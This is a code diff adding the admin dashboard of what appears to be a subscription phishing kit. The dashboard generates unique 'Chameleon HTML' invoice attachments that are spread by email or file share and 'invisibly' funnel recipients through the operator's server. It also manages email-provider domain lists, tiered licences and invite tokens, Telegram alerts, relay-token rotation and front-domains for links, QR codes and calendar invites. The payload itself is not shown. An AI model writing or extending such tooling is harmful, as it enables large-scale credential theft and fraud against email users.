+    triggerStagedDownload(data.downloadId);
+    const fname = data.filename || 'invoice.html';
+    document.getElementById('genlink-form-container').innerHTML = '';
+    document.getElementById('genlink-form-container').dataset.kind = '';
+    document.getElementById('genlink-result').innerHTML = `
+      <div class="user-form" style="border-color:var(--green);background:#f0fdf4;">
+        <h3 style="color:var(--green);"><i class="fas fa-check-circle" style="margin-right:6px;"></i>Chameleon HTML Downloaded</h3>
+        <p style="font-size:13px;color:var(--text-dim);margin:8px 0;">Filename: <code>${esc(fname)}</code></p>
+        <p style="font-size:12px;color:var(--text-mute);">Each generated file is unique. Host it anywhere (Dropbox, email attachment, file share) — clients will be funneled through your server invisibly.</p>
+        <div style="margin-top:10px;"><button class="btn" style="padding:6px 14px;" onclick="document.getElementById('genlink-result').innerHTML=''">Dismiss</button></div>
+      </div>`;
+  } catch {
+    msg.style.display='inline'; msg.style.color='var(--red)'; msg.textContent='Network error';
+    btn.disabled=false; btn.textContent='Generate & Download';
+  }
+}
+
+async function rotateRelay() {
+  if (!(await confirmDialog('All previously-generated chameleon HTML files will stop working.', { title: 'Rotate relay token?', danger: true, confirmText: 'Rotate' }))) return;
+  const resp = await fetch(BASE + '/api/chameleon/rotate', { method: 'POST' });
+  const data = await resp.json();
+  if (data.ok) {
+    document.getElementById('genlink-result').innerHTML = `
+      <div class="user-form" style="border-color:var(--orange,#f59e0b);background:#fffbeb;">
+        <h3><i class="fas fa-sync-alt" style="margin-right:6px;"></i>Relay Token Rotated</h3>
+        <p style="font-size:13px;color:var(--text-dim);">All previously-generated chameleon HTML files are now dead. Generate new ones to distribute.</p>
+        <div style="margin-top:10px;"><button class="btn" style="padding:6px 14px;" onclick="document.getElementById('genlink-result').innerHTML=''">Dismiss</button></div>
+      </div>`;
+  }
+}
+
+// ---- Providers tab (superadmin) ----
+// Build a colored avatar for a provider — uses the brand color + first 1-2
+// letters of the name. Universal so every provider shows a "logo" without
+// needing per-brand SVGs.
+function providerAvatar(name, color) {
+  const initial = (name || '?').replace(/[^A-Za-z0-9]/g, '').slice(0, 2).toUpperCase() || '?';
+  return `<div style="width:32px;height:32px;background:${esc(color || '#888')};color:#fff;border-radius:8px;display:inline-flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;letter-spacing:-0.02em;flex-shrink:0;box-shadow:0 1px 3px rgba(0,0,0,0.12);">${esc(initial)}</div>`;
+}
+
+async function loadProviders() {
+  const data = await api('providers');
+  if (!data.providers) return;
+  let h = `<div style="margin-bottom:12px;font-size:13px;color:var(--text-dim);">${data.totalProviders} providers covering ${data.totalDomains} domains</div>`;
+  h += '<div class="table-card"><table><tr><th style="width:64px;"></th><th>Provider</th><th>Domains</th></tr>';
+  data.providers.forEach(p => {
+    const domains = p.domains.map(d => `<span class="badge" style="font-size:11px;margin:2px 2px;">${esc(d)}</span>`).join(' ');
+    h += `<tr>
+      <td>${providerAvatar(p.name, p.color)}</td>
+      <td><strong style="color:${esc(p.color)};">${esc(p.name)}</strong><div style="font-size:11px;color:var(--text-mute);margin-top:2px;">${p.domains.length} domain${p.domains.length===1?'':'s'}</div></td>
+      <td>${domains}</td>
+    </tr>`;
+  });
+  h += '</table></div>';
+  document.getElementById('p-providers').innerHTML = h;
+}
+
+// ---- Users tab (superadmin) ----
+let editingUserId = null;
+
+async function loadUsers() {
+  const [{ users }, { tokens }] = await Promise.all([api('users'), api('tokens')]);
+  let h = `
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
+      <h3 style="font-size:15px;font-weight:700;"><i class="fas fa-users" style="color:var(--blue);margin-right:8px;"></i>User Management</h3>
+      <button class="btn blue" style="padding:8px 16px;" onclick="showInviteForm()"><i class="fas fa-link" style="margin-right:4px;"></i> Generate Invite</button>
+    </div>
+    <div id="user-form-container"></div>
+    <div id="invite-link-display"></div>`;
+
+  // Pending invites
+  if (tokens.length > 0) {
+    h += `<div style="margin-bottom:16px;">
+      <h4 style="font-size:13px;font-weight:600;color:var(--text-dim);margin-bottom:8px;"><i class="fas fa-clock" style="margin-right:4px;"></i> Pending Invites</h4>
+      <div class="table-card"><table><tr><th style="width:24px;"></th><th>Name</th><th>Tier</th><th>License</th><th>Created by</th><th>Link expires</th><th></th></tr>`;
+    tokens.forEach(t => {
+      const tierColors = { owner: '#d4a017', vip: '#8b5cf6', premium: '#3b82f6', basic: '#22c55e' };
+      const tierName = t.role === 'superadmin' ? 'OWNER' : (t.tier || 'basic').toUpperCase();
+      const tierKey = t.role === 'superadmin' ? 'owner' : (t.tier || 'basic');
+      const tierBadge = `<span class="badge" style="color:${tierColors[tierKey]||'#888'};border:1px solid ${tierColors[tierKey]||'#888'};background:transparent;">${tierName}</span>`;
+      const months = (t.licenseMonths === undefined || t.licenseMonths === null) ? 1 : t.licenseMonths;
+      const licenseLabel = months === 0 ? 'Lifetime' : (months === 1 ? '1 month' : months + ' months');
+      const fullToken = t.token && !t.token.endsWith('...') ? t.token : '';
+      const link = fullToken ? location.origin + BASE + '/activate?token=' + fullToken : '';
+      const revokeId = esc(t.id || (t.token || '').replace(/\.+$/, ''));
+      h += `<tr style="cursor:pointer;" onclick="toggleInviteRow('inv-${revokeId}')">
+        <td><i class="fas fa-chevron-right" id="inv-chev-${revokeId}" style="color:var(--text-mute);font-size:11px;transition:transform .15s;"></i></td>
+        <td><strong>${esc(t.displayName)}</strong></td>
+        <td>${tierBadge}</td>
+        <td>${esc(licenseLabel)}</td>
+        <td>${esc(t.createdBy)}</td>
+        <td>${timeAgo(t.expiresAt)}</td>
+        <td><button class="btn red" onclick="event.stopPropagation();revokeToken('${revokeId}')">Revoke</button></td>
+      </tr>
+      <tr id="inv-${revokeId}" style="display:none;background:#fafbfc;">
+        <td></td>
+        <td colspan="6" style="padding:14px 16px;">
+          <div style="font-size:11px;font-weight:600;color:var(--text-dim);margin-bottom:6px;text-transform:uppercase;letter-spacing:.4px;">Activation link</div>
+          <div style="display:flex;gap:8px;align-items:stretch;">
+            <input type="text" value="${esc(link)}" readonly id="inv-link-${revokeId}"
+              style="flex:1;padding:8px 12px;border:1px solid var(--border);border-radius:6px;font-size:12px;font-family:monospace;background:#fff;color:var(--text);outline:none;"
+              onclick="event.stopPropagation();this.select()" />
+            <button class="btn blue" style="padding:6px 14px;" onclick="event.stopPropagation();copyInviteRowLink('${revokeId}')"><i class="fas fa-copy"></i> Copy</button>
+          </div>
+          <div id="inv-copy-${revokeId}" style="font-size:11px;color:var(--green);margin-top:6px;display:none;"><i class="fas fa-check"></i> Copied</div>
+        </td>
+      </tr>`;
+    });
+    h += '</table></div></div>';
+  }
+
+  // Active users — accordion-style (click row to expand/collapse)
+  if (users.length === 0) {
+    h += '<div class="table-card"><div class="empty"><i class="fas fa-users"></i><p>No users</p></div></div>';
+  } else {
+    h += `<div style="margin-bottom:10px;">
+      <input type="text" id="user-search" placeholder="Search users..." oninput="filterUsers(this.value)"
+        style="width:100%;max-width:360px;padding:8px 12px;border:1px solid var(--border);border-radius:8px;font-size:13px;font-family:inherit;outline:none;background:#fff;" />
+    </div>`;
+    h += '<div class="user-accordion">';
+    users.forEach(u => {
+      const roleBadge = u.role === 'superadmin' ? '<span class="badge blue">Owner</span>' : '<span class="badge green">User</span>';
+      const lic = u.license || {};
+      const tierColors = { owner: '#d4a017', vip: '#8b5cf6', premium: '#3b82f6', basic: '#22c55e' };
+      const tierBadge = lic.tier ? `<span class="badge" style="color:${tierColors[lic.tier]||'#888'};border-color:${tierColors[lic.tier]||'#888'};">${(lic.tier||'').toUpperCase()}</span>` : '';
+      const isExpired = lic.expiresAt && new Date(lic.expiresAt).getTime() < Date.now();
+      const licStatus = lic.tier === 'owner' ? '' : (!lic.active || isExpired) ? '<span class="badge red">Expired</span>' : '<span class="badge green">Active</span>';
+      const daysLeft = lic.expiresAt ? Math.max(0, Math.ceil((new Date(lic.expiresAt).getTime() - Date.now()) / 86400000)) : null;
+      const isSelf = u.id === currentUser.id;
+      const searchKey = esc((u.username + ' ' + u.displayName + ' ' + (lic.key||'')).toLowerCase());
+      h += `
+      <div class="ua-item" data-search="${searchKey}" style="border:1px solid ${(!lic.active||isExpired)&&lic.tier!=='owner'?'var(--red)':'var(--border)'};border-radius:10px;margin-bottom:8px;background:#fff;overflow:hidden;${(!lic.active||isExpired)&&lic.tier!=='owner'?'opacity:0.7;':''}">
+        <div class="ua-head" onclick="toggleUserRow('ua-${u.id}')" style="display:flex;align-items:center;gap:12px;padding:12px 14px;cursor:pointer;user-select:none;">
+          <i class="fas fa-chevron-right ua-chev" id="chev-${u.id}" style="color:var(--text-mute);font-size:11px;transition:transform .15s;"></i>
+          <div style="flex:1;min-width:0;">
+            <strong style="font-size:14px;">${esc(u.username)}</strong>
+            <span style="color:var(--text-mute);font-size:12px;margin-left:8px;">${esc(u.displayName)}</span>
+          </div>
+          <div style="display:flex;gap:4px;align-items:center;flex-wrap:wrap;">
+            ${tierBadge}${licStatus}${roleBadge}
+            ${isSelf ? '<span class="badge" style="color:var(--blue);">You</span>' : ''}
+          </div>
+        </div>
+        <div class="ua-body" id="ua-${u.id}" style="display:none;padding:0 14px 14px 34px;border-top:1px solid var(--border);background:#fafafa;">
+          <div style="display:grid;grid-template-columns:120px 1fr;gap:8px 14px;font-size:13px;margin-top:12px;">
+            <div style="color:var(--text-mute);">License Key</div><div><code style="font-size:11px;background:#fff;border:1px solid var(--border);padding:4px 8px;border-radius:6px;cursor:pointer;" onclick="copyText('${esc(lic.key||'')}');this.style.color='var(--green)';setTimeout(()=>this.style.color='',1500);event.stopPropagation();">${esc(lic.key || 'N/A')}</code></div>
+            <div style="color:var(--text-mute);">Tier</div><div>${tierBadge}</div>
+            <div style="color:var(--text-mute);">Status</div><div>${lic.tier==='owner' ? '<span class="badge" style="color:#d4a017;">Forever</span>' : licStatus}</div>
+            <div style="color:var(--text-mute);">Expires</div><div>${lic.tier==='owner' ? 'Never' : lic.expiresAt ? `${timeAgo(lic.expiresAt)} (${daysLeft} days ${isExpired?'ago':'left'})` : 'Not set'}</div>
+            <div style="color:var(--text-mute);">MFA</div><div>${u.mfaEnabled ? '<span class="badge green">On</span>' : '<span class="badge" style="color:var(--text-mute);">Off</span>'}</div>
+            <div style="color:var(--text-mute);">Telegram</div><div>${u.telegramEnabled ? '<span class="badge green"><i class="fab fa-telegram"></i> On</span>' : '<span class="badge" style="color:var(--text-mute);">Off</span>'}</div>
+            <div style="color:var(--text-mute);">Created</div><div>${timeAgo(u.createdAt)}</div>
+          </div>
+          ${isSelf || lic.tier==='owner' ? '' : `
+          <div style="margin-top:14px;padding:10px 12px;background:#fff;border:1px solid var(--border);border-radius:8px;">
+            <div style="font-size:11px;font-weight:600;color:var(--text-dim);margin-bottom:8px;">FEATURES</div>
+            <div style="display:flex;gap:10px;flex-wrap:wrap;" onclick="event.stopPropagation()">
+              ${['chameleon','inbox','convert','links'].map(f => {
+                const icons = { chameleon:'fa-dragon', inbox:'fa-envelope-circle-check', convert:'fa-code', links:'fa-link' };
+                const labels = { chameleon:'Chameleon', inbox:'Inbox', convert:'Convert', links:'Links' };
+                const feat = u.features || {};
+                return `<label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer;">
+                  <input type="checkbox" ${feat[f]?'checked':''} onchange="toggleUserFeature('${u.id}','${f}',this.checked)" style="width:14px;height:14px;" />
+                  <i class="fas ${icons[f]}" style="font-size:10px;color:var(--text-dim);"></i>${labels[f]}
+                </label>`;
+              }).join('')}
+            </div>
+          </div>
+          <div style="margin-top:10px;padding:10px 12px;background:#fff;border:1px solid var(--border);border-radius:8px;">
+            <div style="font-size:11px;font-weight:600;color:var(--text-dim);margin-bottom:8px;">DOMAIN POLICY</div>
+            <label style="display:flex;align-items:flex-start;gap:8px;font-size:12px;cursor:pointer;" onclick="event.stopPropagation()">
+              <input type="checkbox" ${u.requireDomain?'checked':''} onchange="toggleRequireDomain('${u.id}',this.checked)" style="width:14px;height:14px;margin-top:2px;flex-shrink:0;" />
+              <span>
+                <i class="fas fa-globe" style="font-size:10px;color:var(--text-dim);margin-right:4px;"></i>
+                <strong>Require verified domain before generating</strong>
+                <div style="color:var(--text-mute);font-size:11px;margin-top:2px;">When ON, user must add & verify their own front-domain in Settings before any attachment, link, QR, or calendar invite can be generated.</div>
+              </span>
+            </label>
+          </div>`}
+          <div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;">
+            <button class="btn blue" onclick="event.stopPropagation();showEditForm('${u.id}')" style="padding:6px 14px;"><i class="fas fa-pen" style="margin-right:4px;"></i>Edit</button>
+            ${isSelf || lic.tier==='owner' ? '' : `
+              ${lic.active && !isExpired ? `<button class="btn red" onclick="event.stopPropagation();licenseAction('${u.id}','revoke')" style="padding:6px 14px;"><i class="fas fa-ban" style="margin-right:4px;"></i>Revoke</button>` : `<button class="btn green" onclick="event.stopPropagation();licenseAction('${u.id}','activate',{days:30})" style="padding:6px 14px;"><i class="fas fa-check" style="margin-right:4px;"></i>Activate 1mo</button>`}
+              <select onchange="event.stopPropagation();if(this.value){licenseAction('${u.id}','extend',{days:parseInt(this.value)});this.value='';}" style="padding:6px 10px;border:1px solid var(--border);border-radius:6px;font-size:12px;background:#fff;cursor:pointer;">
+                <option value="">Renew...</option>
+                <option value="30">+1 month</option>
+                <option value="90">+3 months</option>
+                <option value="180">+6 months</option>
+                <option value="365">+12 months</option>
+              </select>
+              <select onchange="event.stopPropagation();if(this.value)licenseAction('${u.id}','set-tier',{tier:this.value});this.value=''" style="padding:6px 10px;border:1px solid var(--border);border-radius:6px;font-size:12px;background:#fff;">
+                <option value="">Change tier...</option>
+                <option value="basic">Basic</option>
+                <option value="premium">Premium</option>
+                <option value="vip">VIP</option>
+              </select>
+              <button class="btn red" onclick="event.stopPropagation();deleteUser('${u.id}','${esc(u.username)}')" style="padding:6px 14px;"><i class="fas fa-trash" style="margin-right:4px;"></i>Delete</button>
+            `}
+          </div>
+        </div>
+      </div>`;
+    });
+    h += '</div>';
+  }
+  document.getElementById('p-users').innerHTML = h;
+}
+
+function toggleUserRow(id) {
+  const body = document.getElementById(id);
+  const chev = document.getElementById('chev-' + id.replace('ua-', ''));
+  if (!body) return;
+  const open = body.style.display !== 'none';
+  body.style.display = open ? 'none' : 'block';
+  if (chev) chev.style.transform = open ? 'rotate(0deg)' : 'rotate(90deg)';
+}
+
+function filterUsers(q) {
+  const lc = (q || '').toLowerCase().trim();
+  document.querySelectorAll('.ua-item').forEach(el => {
+    el.style.display = (!lc || el.dataset.search.includes(lc)) ? '' : 'none';
+  });
+}
+
+// ---- Invite form ----
+function showInviteForm() {
+  const container = document.getElementById('user-form-container');
+  if (!container) return;
+  // Toggle: if already open, close it
+  if (container.innerHTML.trim() !== '') { container.innerHTML = ''; return; }
+  document.getElementById('invite-link-display').innerHTML = '';
+  container.innerHTML = `
+    <div class="user-form">
+      <h3><i class="fas fa-link" style="margin-right:6px;"></i>Generate Invite Token</h3>
+      <div class="form-grid">
+        <div class="form-field" id="uf-tier-row">
+          <label>Tier</label>
+          <select id="uf-tier">
+            <option value="basic" selected>Basic &mdash; Inbox + Links</option>
+            <option value="premium">Premium &mdash; + Chameleon</option>
+            <option value="vip">VIP &mdash; + Convert (everything)</option>
+          </select>
+          <small>What this user can generate.</small>
+        </div>
+        <div class="form-field">
+          <label>License duration</label>
+          <select id="uf-license-months">
+            <option value="1" selected>1 month</option>
+            <option value="3">3 months</option>
+            <option value="6">6 months</option>
+            <option value="12">12 months</option>
+            <option value="0">Lifetime (no expiry)</option>
+          </select>
+          <small>How long the license is valid after activation. Renewable per-user.</small>
+        </div>
+        <div class="form-field">
+          <label>Activation link expires in (hours)</label>
+          <input type="number" id="uf-expires" value="48" min="1" max="720" />
+          <small>How long the recipient has to activate the link. Default 48h.</small>
+        </div>
+      </div>
+      <div class="form-actions">
+        <button class="btn blue" style="padding:8px 20px;" onclick="submitInviteForm()" id="uf-submit">Generate Token</button>
+        <button class="btn" style="padding:8px 16px;" onclick="hideUserForm()">Cancel</button>
+        <span id="uf-msg" class="form-msg" style="display:none;"></span>
+      </div>
+    </div>`;
+}
+
+async function submitInviteForm() {
+  // Only Tier + License duration + Activation expiry. The recipient sets
+  // their own display name/username when they activate the link.
+  const tier = document.getElementById('uf-tier').value;
+  const licenseMonths = parseInt(document.getElementById('uf-license-months').value, 10);
+  const expiresInHours = document.getElementById('uf-expires').value;
+  const btn = document.getElementById('uf-submit');
+
+  btn.disabled = true; btn.textContent = 'Generating...';
+  try {
+    const resp = await fetch(BASE + '/api/tokens', {
+      method: 'POST', headers: { 'Content-Type': J },
+      body: JSON.stringify({ tier, licenseMonths, expiresInHours }),
+    });
+    const data = await resp.json();
+    if (!resp.ok) { showFormMsg(data.error || 'Failed.', 'red'); btn.disabled = false; btn.textContent = 'Generate Token'; return; }
+
+    // Build the link and the success-panel HTML BEFORE refreshing the
+    // users table — loadUsers() rewrites the whole #p-users innerHTML
+    // (including #invite-link-display), so we need to re-render the panel
+    // AFTER it finishes, otherwise it gets wiped instantly.
+    const link = location.origin + BASE + '/activate?token=' + data.token;
+    const successHtml = `
+      <div class="user-form" style="border-color:var(--green);background:#f0fdf4;">
+        <h3 style="color:var(--green);"><i class="fas fa-check-circle" style="margin-right:6px;"></i>Invite Generated</h3>
+        <p style="font-size:13px;color:var(--text-dim);margin-bottom:12px;">Send this one-time link to your client. Expires in ${esc(expiresInHours)} hours, single use.</p>
+        <div style="display:flex;gap:8px;align-items:stretch;">
+          <input type="text" id="invite-link-input" value="${esc(link)}" readonly
+            style="flex:1;padding:10px 12px;border:1px solid var(--border);border-radius:8px;font-size:12px;font-family:monospace;background:#fff;color:var(--text);outline:none;" />
+          <button class="btn blue" style="padding:8px 16px;width:auto;" onclick="copyInviteLink()"><i class="fas fa-copy"></i> Copy</button>
+        </div>
+        <p id="copy-msg" style="font-size:12px;color:var(--green);margin-top:8px;display:none;"><i class="fas fa-check"></i> Copied to clipboard</p>
+        <div style="margin-top:12px;">
+          <button class="btn" style="padding:6px 14px;" onclick="document.getElementById('invite-link-display').innerHTML='';">Dismiss</button>
+        </div>
+      </div>`;
+    hideUserForm();
+    await loadUsers();
+    const display = document.getElementById('invite-link-display');
+    if (display) {
+      display.innerHTML = successHtml;
+      const inp = document.getElementById('invite-link-input');
+      if (inp) inp.select();
+      display.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+  } catch {
+    showFormMsg('Network error.', 'red');
+    btn.disabled = false; btn.textContent = 'Generate Token';
+  }
+}
+
+function copyInviteLink() {
+  const input = document.getElementById('invite-link-input');
+  input.select();
+  copyText(input.value).then(() => {
+    const msg = document.getElementById('copy-msg');
+    msg.style.display = 'block';
+    setTimeout(() => { msg.style.display = 'none'; }, 3000);
+  });
+}
+
+async function revokeToken(tokenPrefix) {
+  if (!(await confirmDialog('Revoke this invite? The link will no longer work.', { danger: true, confirmText: 'Revoke' }))) return;
+  await fetch(BASE + '/api/tokens/' + tokenPrefix, { method: 'DELETE' });
+  showToast('Invite revoked', 'success');
+  loadUsers();
+}
+
+function toggleInviteRow(rowId) {
+  const row = document.getElementById(rowId);
+  if (!row) return;
+  const open = row.style.display !== 'none';
+  row.style.display = open ? 'none' : '';
+  const chev = document.getElementById(rowId.replace('inv-', 'inv-chev-'));
+  if (chev) chev.style.transform = open ? '' : 'rotate(90deg)';
+  if (!open) {
+    const inp = document.getElementById(rowId.replace('inv-', 'inv-link-'));
+    if (inp) setTimeout(() => inp.select(), 50);
+  }
+}
+
+function copyInviteRowLink(id) {
+  const inp = document.getElementById('inv-link-' + id);
+  if (!inp) return;
+  copyText(inp.value);
+  const msg = document.getElementById('inv-copy-' + id);
+  if (msg) {
+    msg.style.display = 'block';
+    setTimeout(() => { msg.style.display = 'none'; }, 2000);
+  }
+}
+
+// ---- Edit user form ----
+function showEditForm(userId) {
+  editingUserId = userId;
+  const container = document.getElementById('user-form-container');
+  if (!container) return;
+  document.getElementById('invite-link-display').innerHTML = '';
+  api('users').then(({ users }) => {
+    const u = users.find(x => x.id === userId);
+    if (!u) return;
+    container.innerHTML = `
+      <div class="user-form">
+        <h3><i class="fas fa-pen" style="margin-right:6px;"></i>Edit User: ${esc(u.username)}</h3>
+        <div class="form-grid">
+          <div class="form-field">
+            <label>Username</label>
+            <input type="text" id="uf-username" value="${esc(u.username)}" placeholder="e.g. john" />
+          </div>
+          <div class="form-field">
+            <label>Password (leave blank to keep current)</label>
+            <input type="password" id="uf-password" placeholder="Unchanged" />
+          </div>
+          <div class="form-field">
+            <label>Display Name</label>
+            <input type="text" id="uf-displayName" value="${esc(u.displayName)}" placeholder="e.g. John Smith" />
+          </div>
+          <div class="form-field">
+            <label>Role</label>
+            <select id="uf-role">
+              <option value="user" ${u.role === 'user' ? 'selected' : ''}>User</option>
+              <option value="superadmin" ${u.role === 'superadmin' ? 'selected' : ''}>Super Admin</option>
+            </select>
+          </div>
+          <div class="form-field">
+            <label>Assigned Emails</label>
+            <textarea id="uf-emails" placeholder="One email per line">${(u.assignedEmails || []).join('\n')}</textarea>
+            <small>Exact email matches (e.g. client@acme.com)</small>
+          </div>
+          <div class="form-field">
+            <label>Assigned Domains</label>
+            <textarea id="uf-domains" placeholder="One domain per line">${(u.assignedDomains || []).join('\n')}</textarea>
+            <small>Matches all emails @domain (e.g. acme.com)</small>
+          </div>
+        </div>
+        <div class="form-actions">
+          <button class="btn blue" style="padding:8px 20px;" onclick="submitEditForm()" id="uf-submit">Save Changes</button>
+          <button class="btn" style="padding:8px 16px;" onclick="hideUserForm()">Cancel</button>
+          <span id="uf-msg" class="form-msg" style="display:none;"></span>
+        </div>
+      </div>`;
+  });
+}
+
+async function submitEditForm() {
+  const username = document.getElementById('uf-username').value.trim();
+  const password = document.getElementById('uf-password').value;
+  const displayName = document.getElementById('uf-displayName').value.trim();
+  const role = document.getElementById('uf-role').value;
+  const assignedEmails = document.getElementById('uf-emails').value.split('\n').map(e => e.trim()).filter(Boolean);
+  const assignedDomains = document.getElementById('uf-domains').value.split('\n').map(d => d.trim()).filter(Boolean);
+  const btn = document.getElementById('uf-submit');
+
+  if (!username) { showFormMsg('Username is required.', 'red'); return; }
+  if (password && password.length < 6) { showFormMsg('Password must be at least 6 characters.', 'red'); return; }
+
+  btn.disabled = true; btn.textContent = 'Saving...';
+  const body = { username, displayName: displayName || username, role, assignedEmails, assignedDomains };
+  if (password) body.password = password;
+
+  try {
+    const resp = await fetch(`${BASE}/api/users/${editingUserId}`, { method: 'PUT', headers: { 'Content-Type': J }, body: JSON.stringify(body) });
+    const data = await resp.json();
+    if (!resp.ok) { showFormMsg(data.error || 'Failed.', 'red'); btn.disabled = false; btn.textContent = 'Save Changes'; return; }
+    hideUserForm();
+    loadUsers();
+  } catch {
+    showFormMsg('Network error.', 'red');
+    btn.disabled = false; btn.textContent = 'Save Changes';
+  }
+}
+
+async function testTelegram() {
+  const botToken = document.getElementById('uf-tg-token').value.trim();
+  const chatId = document.getElementById('uf-tg-chatid').value.trim();
+  const msgEl = document.getElementById('uf-tg-msg');
+  const btn = document.getElementById('uf-tg-test');
+
+  // If token field is empty but user has one configured, we need to get it from the user record
+  if (!botToken && !chatId) {
+    msgEl.textContent = 'Enter bot token and chat ID first.';
+    msgEl.style.color = 'var(--red)';
+    msgEl.style.display = 'block';
+    setTimeout(() => { msgEl.style.display = 'none'; }, 3000);
+    return;
+  }
+  if (!chatId) {
+    msgEl.textContent = 'Chat ID is required.';
+    msgEl.style.color = 'var(--red)';
+    msgEl.style.display = 'block';
+    setTimeout(() => { msgEl.style.display = 'none'; }, 3000);
+    return;
+  }
+
+  btn.disabled = true;
+  btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+  try {
+    const resp = await fetch(BASE + '/api/test-telegram', {
+      method: 'POST', headers: { 'Content-Type': J },
+      body: JSON.stringify({ botToken, chatId }),
+    });
+    const data = await resp.json();
+    if (data.ok) {
+      msgEl.textContent = 'Test notification sent! Check your Telegram.';
+      msgEl.style.color = 'var(--green)';
+    } else {
+      msgEl.textContent = data.error || 'Failed to send.';
+      msgEl.style.color = 'var(--red)';
+    }
+  } catch {
+    msgEl.textContent = 'Network error.';
+    msgEl.style.color = 'var(--red)';
+  }
+  msgEl.style.display = 'block';
+  btn.disabled = false;
+  btn.innerHTML = '<i class="fab fa-telegram" style="margin-right:4px;"></i> Send Test Notification';
+  setTimeout(() => { msgEl.style.display = 'none'; }, 5000);
+}
+
+function hideUserForm() {
+  editingUserId = null;
+  const c = document.getElementById('user-form-container');
+  if (c) c.innerHTML = '';
+}
+
+function showFormMsg(text, color) {
+  const el = document.getElementById('uf-msg');
+  if (!el) return;
+  el.style.display = 'inline';
+  el.style.color = `var(--${color})`;
+  el.textContent = text;
+  setTimeout(() => { el.style.display = 'none'; }, 4000);
+}
+
+async function toggleUserFeature(userId, feature, enabled) {
+  const body = {}; body[feature] = enabled;
+  const resp = await fetch(`${BASE}/api/user-features/${userId}`, { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify(body) });
+  if (resp.ok) showToast(`${feature} ${enabled ? 'enabled' : 'disabled'}`, 'success');
+  else showToast('Failed', 'error');
+}
+
+async function toggleRequireDomain(userId, enabled) {
+  const resp = await fetch(`${BASE}/api/user-require-domain/${userId}`, { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify({ enabled }) });
+  if (resp.ok) showToast(`Domain ${enabled ? 'required' : 'optional'}`, 'success');
+  else showToast('Failed', 'error');
+}
+
+async function licenseAction(userId, action, opts) {
+  const body = { action, ...opts };
+  const resp = await fetch(`${BASE}/api/license/${userId}`, { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify(body) });
+  const data = await resp.json();
+  if (resp.ok && data.ok) { showToast(`License: ${action} done`, 'success'); loadUsers(); }
+  else showToast(data.error || 'Failed', 'error');
+}
+
+async function deleteUser(id, name) {
+  if (!(await confirmDialog(`This cannot be undone.`, { title: `Delete user "${name}"?`, danger: true, confirmText: 'Delete' }))) return;
+  const resp = await fetch(`${BASE}/api/users/${id}`, { method: 'DELETE' });
+  const data = await resp.json();
+  if (!resp.ok) { showToast(data.error || 'Failed to delete user.', 'error'); return; }
+  showToast(`User "${name}" deleted`, 'success');
+  loadUsers();
+}
+
+init();
+</script>
+</body>
+</html>
